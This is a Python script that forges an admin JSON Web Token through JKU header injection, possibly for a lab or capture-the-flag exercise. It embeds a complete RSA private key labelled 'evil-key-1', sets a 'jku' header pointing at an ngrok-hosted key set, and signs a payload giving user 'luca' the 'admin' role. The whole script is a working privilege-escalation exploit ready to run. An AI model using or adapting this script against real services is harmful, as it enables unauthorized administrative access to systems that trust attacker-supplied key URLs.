import jwt

# 1. Your exact private key in JWK format
private_jwk = {
    "p": "8LbvHy10O0wFhKRHT_-C5r2Kh63V1l0Fj8l6QkWS1DNGyUHB_eHWBQ4UAUpIbAsqm0GkWRY8OCbsHK7eg1Wqwm1vOjxHkyxvgEkbPRV8ZM0Nc_VlsM4Y-stb9ajDDsUvBRGT16haWz_OnIZ3yS1iB0BYUbKOH_AJqARtr1W5b7U",
    "kty": "RSA",
    "q": "yOssP9Mj9VvI_RD3wOgAIyD5yIUa70BRQZXuTdAWFLCGbYBsG4NuBuVFZ3sjRYYGyPjqZnApWzp3txJ5QGKYg-ccpbjkbdEGclR_GjAY14ngC0e7Dob2Ug-4JcWN3x0w4DW4Sr8sAbaql-EFA8JaCJbl81qTf5chhVFRT9dayOE",
    "d": "BNXAsieA6jrynLEB6nQTaoKXv1xNOe3uwS-_7Jg1Eyc9ksC85gd5LdwhrCq-sGC_pFQkW3UoIuOzQ-ah86wWW3trXicocP-QyhfsBu4Us0vxe0LsAJLtBYCAYp9yUH9AExvte-0OvEAySWVakn-hWE7ZebAUI_mCykp8t8O6lNnR4CrsQ5ZnWIalsgcFA3xxnk0yvQGuze2ZosZ0Rq9gvA4C7Fht9bfvTzq9m9awB0hPLUv23HkJ28kRC5Mwpqic4LvFKlyKCUwc7ixhFwE9Uc5Cb8JDqK_FNTCJ6lmEwKCjfQ9SKlZbowDj6IGqyk9Zy_IRF0q8-boP0g1qr60W4Q",
    "e": "AQAB",
    "use": "sig",
    "kid": "evil-key-1",
    "qi": "mxlm6AueYEY7_rEMVzJ9XUndhaJV5wcHmBPpaGrLq_9idlWm0ILhRT7o5ADNx6wSsnw9qqvfHHML6DrZzk8rqkjmKWdEnlXGvSUWph9WGPCJVs15xsiAPGXL1wLYgqQ4-3_R_S1qgkzDCCkY-tvpUHkdTPEwZxOBHNb9CWeVXdw",
    "dp": "uVKd1ssP6Xcl6HDx1k1JYowa00qqj1ceqQzc65jU6jpwDRJrYCM2ur2T-UpPZ59RNibbeRr9Ud3lek_HUCXsSbQnJhaypERZs9KU_fpEwvZ7nQMZP33tDWjza7Z6NizpfmWCBU7AAfCmCSwdnO0rw5luZbeqZDxRsuF18L92_OE",
    "alg": "RS256",
    "dq": "rj5lzaRK1wqWsAH7Gy0YkV6TwTbOORdKYNqqJImF3MOKkYSCPQoqbYiAPFIqMK0fTUOx5Mz40MlP8VDwHspjAmF4ErDaSfKw6I4m_IshwCsuRhobO2oITPqc9QTzGL-0F33_KbPJcmL8Z2Maejwe4LwdCINQz6I9y-TN47QcY4E",
    "n": "vOwMWVHIU1DBexOq5wFkVGf7G9MQQJZLCUXiNpXox2JKaBC8dqag2O-PGUkz4AOqid5zGUz6eWSRs5e7DrJahUn3AX35FENHHLBOlQ95SN1u9KcEsViUHf7WiqOv3DfMKQ7biX0RQZUqBpWmTo84WXio5ESBSVL1BLxZBa1nOpBRHgzv44F53o_Y7MxyUmKVEVpiUSY9fCCbBGC_kvR85K26_cKKhIA5w8_6i7H1tlVxwLQXKeMgf7bBk1xNN48ZgnkCbye28G7_5mq43IwDTPsKtT2oi2x3FxmeLim3_V-lbsy42KC55M-BAlfLcd-3qllUQTDGQLJ0Dv_wf-KWFQ"
}

# 2. The headers for JKU injection (UPDATE YOUR NGROK URL HERE)
custom_headers = {
    "jku": "https://splice-deploy-lubricate.ngrok-free.dev/jwks.json",
    "kid": "evil-key-1"
}

# 3. The forged admin payload
payload = {
  "sub": "luca",
  "user_id": 4,
  "role": "admin",
  "iat": 1776180569,
  "exp": 1776184169
}

# Load the key and generate the token
key = jwt.algorithms.RSAAlgorithm.from_jwk(private_jwk)
forged_token = jwt.encode(payload, key, algorithm="RS256", headers=custom_headers)

print("\n--- YOUR FORGED TOKEN ---")
print(forged_token)
print("-------------------------\n")
